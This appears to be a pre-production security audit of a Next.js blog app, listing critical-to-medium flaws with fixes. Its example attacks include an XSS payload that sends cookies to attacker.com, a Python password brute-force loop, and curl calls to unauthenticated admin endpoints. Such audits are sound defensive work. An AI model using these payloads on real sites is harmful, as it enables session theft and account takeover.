# Security Issues and Recommended Fixes

**Date:** 2025-11-20
**Status:** Pre-Production Security Review
**Severity Levels:** 🔴 Critical | 🟠 High | 🟡 Medium | 🔵 Low

---

## Summary

| Severity | Count | Description |
|----------|-------|-------------|
| 🔴 Critical | 10 | Immediate security risks requiring urgent fixes |
| 🟠 High | 7 | Significant vulnerabilities to address soon |
| 🟡 Medium | 15 | Moderate issues to improve security posture |
| 🔵 Low | 18 | Minor improvements and best practices |

**Total Issues:** 50

---

## Critical Issues (Fix Immediately)

### 🔴 CRITICAL-01: Exposed Diagnostic Endpoints

**Severity:** Critical
**Files:**
- `src/app/api/database-diagnostic/route.ts`
- `src/app/api/db-test/route.ts`

**Description:**
These endpoints are publicly accessible and expose sensitive information:
- Database schema details
- Server IP addresses
- Database host information
- Connection pool status
- Sample data from tables

**Impact:**
- Information disclosure
- Helps attackers plan targeted attacks
- Reveals infrastructure details

**Exploit Scenario:**
```bash
curl https://your-app.com/api/database-diagnostic
# Returns database schema, host, and sensitive metadata
```

**Fix:**

**Option 1: Remove Entirely (Recommended)**
```bash
rm src/app/api/database-diagnostic/route.ts
rm src/app/api/db-test/route.ts
```

**Option 2: Secure with Admin-Only Access**
```typescript
// src/app/api/database-diagnostic/route.ts
import { NextResponse } from 'next/server'
import { getAuthenticatedUser } from '@/lib/auth'

export async function GET() {
  // Require authentication and admin role
  const user = await getAuthenticatedUser()

  if (!user || user.role !== 'ADMIN') {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  // Only allow in development
  if (process.env.NODE_ENV === 'production') {
    return NextResponse.json({ error: 'Not available' }, { status: 403 })
  }

  // Rest of diagnostic code...
}
```

**Verification:**
```bash
# Should return 401 Unauthorized
curl https://your-app.com/api/database-diagnostic

# With admin auth should work
curl -H "Cookie: auth-token=ADMIN_TOKEN" https://your-app.com/api/database-diagnostic
```

---

### 🔴 CRITICAL-02: Unprotected Admin Prayer Requests Endpoint

**Severity:** Critical
**File:** `src/app/api/admin/prayer-requests/route.ts`

**Description:**
The GET endpoint has no authentication check, allowing anyone to read all prayer requests including private ones.

**Current Code:**
```typescript
export async function GET(request: NextRequest) {
  // No authentication check!
  const url = new URL(request.url)
  // ... fetch and return all prayer requests
}
```

**Impact:**
- Privacy violation - private prayer requests exposed
- Sensitive personal information leaked
- Trust violation with users

**Exploit:**
```bash
curl https://your-app.com/api/admin/prayer-requests
# Returns all prayer requests including private ones
```

**Fix:**
```typescript
import { getAuthenticatedUser } from '@/lib/auth'
import { hasPermission } from '@/lib/rbac'

export async function GET(request: NextRequest) {
  // Add authentication check
  const user = await getAuthenticatedUser()

  if (!user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  // Check permissions
  if (!hasPermission(user.role, 'read:analytics')) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
  }

  // Rest of the code...
}
```

---

### 🔴 CRITICAL-03: No Rate Limiting on Login Endpoint

**Severity:** Critical
**File:** `src/app/api/auth/login/route.ts`

**Description:**
Login endpoint has no rate limiting, allowing unlimited brute force attempts.

**Impact:**
- Account compromise via brute force
- Resource exhaustion (DDoS)
- No deterrent for password guessing

**Attack Scenario:**
```python
# Attacker script
for password in common_passwords:
    response = requests.post('https://app.com/api/auth/login', json={
        'email': 'admin@example.com',
        'password': password
    })
    if response.status_code == 200:
        print(f"Found password: {password}")
        break
```

**Fix:**
```typescript
import { rateLimit, rateLimitConfigs } from '@/lib/utils/rate-limit'
import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  // Add strict rate limiting (5 attempts per minute)
  const limiter = rateLimit(rateLimitConfigs.strict)
  const rateLimitResult = limiter(request)

  if (!rateLimitResult.success) {
    return NextResponse.json(
      {
        error: 'Too many login attempts. Please try again later.',
        resetTime: rateLimitResult.resetTime
      },
      {
        status: 429,
        headers: {
          'Retry-After': String(Math.ceil((rateLimitResult.resetTime - Date.now()) / 1000))
        }
      }
    )
  }

  // Rest of login logic...
}
```

**Additional Recommendations:**
1. Implement progressive delays (exponential backoff)
2. Add account lockout after 5 failed attempts
3. Log all failed login attempts
4. Alert on suspicious login patterns

---

### 🔴 CRITICAL-04: Hardcoded Setup Key

**Severity:** Critical
**File:** `src/app/api/admin/setup/route.ts`

**Description:**
Default setup key 'kylee-blog-setup-2024' is hardcoded and easily guessable.

**Current Code:**
```typescript
const setupKey = body.setupKey || 'kylee-blog-setup-2024'
```

**Impact:**
- Anyone who knows the key can create admin accounts
- Key can be extracted from source code if exposed
- No way to rotate the key

**Fix:**

1. **Update Code:**
```typescript
import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  // Only allow setup in development or with explicit flag
  if (process.env.NODE_ENV === 'production' && process.env.ALLOW_ADMIN_SETUP !== 'true') {
    return NextResponse.json(
      { error: 'Setup not allowed in production' },
      { status: 403 }
    )
  }

  const body = await request.json()

  // Require setup key from environment
  const expectedSetupKey = process.env.ADMIN_SETUP_KEY

  if (!expectedSetupKey) {
    return NextResponse.json(
      { error: 'Setup key not configured' },
      { status: 500 }
    )
  }

  if (body.setupKey !== expectedSetupKey) {
    return NextResponse.json(
      { error: 'Invalid setup key' },
      { status: 401 }
    )
  }

  // Rest of setup logic...
}
```

2. **Update .env.example:**
```bash
# Generate with: openssl rand -hex 32
ADMIN_SETUP_KEY="your-secure-random-setup-key-here-minimum-32-chars"
```

3. **Generate Secure Key:**
```bash
openssl rand -hex 32
# or
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

---

### 🔴 CRITICAL-05: Missing RBAC on Admin Stats Endpoint

**Severity:** Critical
**File:** `src/app/api/admin/stats/route.ts`

**Description:**
Endpoint checks authentication but doesn't verify ADMIN role or permissions.

**Impact:**
- Any authenticated user can view admin statistics
- Information disclosure about the application
- Privacy violation

**Fix:**
```typescript
import { getAuthenticatedUser } from '@/lib/auth'
import { hasPermission } from '@/lib/rbac'

export async function GET() {
  const user = await getAuthenticatedUser()

  if (!user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  // Check for analytics permission
  if (!hasPermission(user.role, 'read:analytics')) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
  }

  // Rest of stats logic...
}
```

---

### 🔴 CRITICAL-06: Missing RBAC on Donations Endpoint

**Severity:** Critical
**File:** `src/app/api/admin/donations/route.ts`

**Description:**
Similar to stats, only checks authentication, not role permissions.

**Fix:**
```typescript
import { getAuthenticatedUser } from '@/lib/auth'
import { hasPermission } from '@/lib/rbac'

export async function GET() {
  const user = await getAuthenticatedUser()

  if (!user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  if (!hasPermission(user.role, 'read:donations')) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
  }

  // Rest of logic...
}
```

---

### 🔴 CRITICAL-07: Missing RBAC on Goals Admin Endpoints

**Severity:** Critical
**Files:**
- `src/app/api/admin/goals/route.ts`
- `src/app/api/admin/goals/[id]/route.ts`

**Description:**
Goal management endpoints don't check permissions.

**Fix:**
```typescript
// GET goals - require read:goals permission
const user = await getAuthenticatedUser()
if (!user || !hasPermission(user.role, 'read:goals')) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}

// POST goals - require write:goals permission
const user = await getAuthenticatedUser()
if (!user || !hasPermission(user.role, 'write:goals')) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}

// DELETE goals - require delete:goals permission
const user = await getAuthenticatedUser()
if (!user || !hasPermission(user.role, 'delete:goals')) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}
```

---

### 🔴 CRITICAL-08: XSS via Post Content

**Severity:** Critical
**Files:**
- `src/app/api/posts/route.ts`
- Post creation and display components

**Description:**
Post content is stored and rendered without sanitization, allowing XSS attacks.

**Impact:**
- JavaScript execution in other users' browsers
- Session hijacking
- Malicious redirects
- Data theft

**Attack Example:**
```html
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
<script>alert('XSS')</script>
```

**Fix:**

1. **Install DOMPurify:**
```bash
npm install isomorphic-dompurify
npm install --save-dev @types/dompurify
```

2. **Server-side Sanitization:**
```typescript
import DOMPurify from 'isomorphic-dompurify'

// In post creation endpoint
const sanitizedContent = DOMPurify.sanitize(body.content, {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'ul', 'ol', 'li', 'blockquote', 'a', 'code', 'pre'
  ],
  ALLOWED_ATTR: ['href', 'target', 'rel'],
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i
})

await db.createPost({
  ...body,
  content: sanitizedContent
})
```

3. **Client-side Protection (Defense in Depth):**
```typescript
// In display component
import DOMPurify from 'isomorphic-dompurify'

function PostContent({ content }: { content: string }) {
  const sanitized = DOMPurify.sanitize(content)
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />
}
```

---

### 🔴 CRITICAL-09: XSS via Comments

**Severity:** Critical
**File:** `src/app/api/posts/[slug]/comments/route.ts`

**Description:**
Comments are not sanitized, allowing XSS.

**Fix:**
Same as CRITICAL-08, apply DOMPurify sanitization to comment content.

---

### 🔴 CRITICAL-10: No Password Strength Requirements

**Severity:** Critical
**Files:**
- `src/app/api/admin/setup/route.ts`
- `src/app/api/admin/users/route.ts`

**Description:**
Only checks for 8+ characters, no complexity requirements.

**Impact:**
- Weak passwords easily guessed
- Brute force attacks more likely to succeed

**Fix:**

1. **Create Password Validator:**
```typescript
// src/lib/validation/password.ts
export function validatePasswordStrength(password: string): {
  valid: boolean
  errors: string[]
} {
  const errors: string[] = []

  if (password.length < 12) {
    errors.push('Password must be at least 12 characters long')
  }

  if (!/[a-z]/.test(password)) {
    errors.push('Password must contain at least one lowercase letter')
  }

  if (!/[A-Z]/.test(password)) {
    errors.push('Password must contain at least one uppercase letter')
  }

  if (!/[0-9]/.test(password)) {
    errors.push('Password must contain at least one number')
  }

  if (!/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) {
    errors.push('Password must contain at least one special character')
  }

  // Check against common passwords
  const commonPasswords = [
    'password', '12345678', 'qwerty', 'admin', 'letmein', 'welcome',
    'monkey', '1234567890', 'password123', 'admin123'
  ]

  if (commonPasswords.some(common =>
    password.toLowerCase().includes(common)
  )) {
    errors.push('Password is too common')
  }

  return {
    valid: errors.length === 0,
    errors
  }
}
```

2. **Use in Endpoints:**
```typescript
import { validatePasswordStrength } from '@/lib/validation/password'

const passwordValidation = validatePasswordStrength(body.password)
if (!passwordValidation.valid) {
  return NextResponse.json({
    error: 'Password does not meet requirements',
    details: passwordValidation.errors
  }, { status: 400 })
}
```

---

## High Priority Issues

### 🟠 HIGH-01: No CSRF Protection

**Severity:** High

**Description:**
While SameSite=lax cookies provide some protection, proper CSRF tokens should be implemented.

**Fix:**
Implement CSRF token generation and validation for all state-changing operations.

### 🟠 HIGH-02: No Audit Logging

**Severity:** High

**Description:**
No logging of admin actions, making forensic analysis impossible.

**Fix:**
Create audit log table and log all admin operations:
- Who did it
- What they did
- When they did it
- IP address
- User agent

### 🟠 HIGH-03: Password Reset Missing

**Severity:** High

**Description:**
No way for users to reset forgotten passwords.

**Fix:**
Implement password reset flow with:
- Email verification
- Time-limited reset tokens
- Secure token storage

### 🟠 HIGH-04: No Email Verification

**Severity:** High

**Description:**
Email addresses not verified, allowing fake accounts.

**Fix:**
Add email verification with confirmation tokens.

### 🟠 HIGH-05: Session Management Missing

**Severity:** High

**Description:**
No way to view or revoke active sessions.

**Fix:**
- Store sessions in database
- Add session management UI
- Allow session revocation

### 🟠 HIGH-06: No Input Length Limits

**Severity:** High

**Description:**
Some endpoints don't validate input length, allowing DoS.

**Fix:**
Add length limits to all string inputs.

### 🟠 HIGH-07: Error Messages Too Verbose

**Severity:** High

**Description:**
Error messages reveal too much information about the system.

**Fix:**
Use generic error messages in production, log details server-side.

---

## Medium Priority Issues

### 🟡 MEDIUM-01 through MEDIUM-15

See detailed analysis document for full list of medium-priority issues including:
- SQL injection (low risk due to Prisma, but validate IDs)
- File upload validation
- Content Security Policy headers
- Secure headers missing
- HTTPS enforcement
- Rate limiting on other endpoints
- And more...

---

## Implementation Priority

### Week 1 (Critical)
1. Fix all CRITICAL-01 through CRITICAL-10
2. Add rate limiting to login
3. Remove or secure diagnostic endpoints
4. Implement XSS sanitization

### Week 2 (High Priority)
1. Add CSRF protection
2. Implement audit logging
3. Add password reset flow
4. Implement email verification

### Week 3 (Medium Priority)
1. Add security headers
2. Implement remaining rate limits
3. Add comprehensive error handling
4. Session management

### Week 4 (Testing & Hardening)
1. Security testing
2. Penetration testing
3. Code review
4. Documentation update

---

## Testing Checklist

After implementing fixes, test:

- [ ] Login rate limiting works
- [ ] XSS attempts are blocked
- [ ] Diagnostic endpoints require auth
- [ ] RBAC properly enforced
- [ ] Password strength enforced
- [ ] Setup key from environment only
- [ ] Audit logs created for admin actions
- [ ] CSRF tokens validated
- [ ] Email verification works
- [ ] Password reset flow works

---

## Security Resources

- **OWASP Top 10:** https://owasp.org/Top10/
- **OWASP Cheat Sheets:** https://cheatsheetseries.owasp.org/
- **Security Headers:** https://securityheaders.com/
- **Content Security Policy:** https://content-security-policy.com/

---

**Document Version:** 1.0
**Last Updated:** 2025-11-20
**Next Review:** After critical fixes implemented
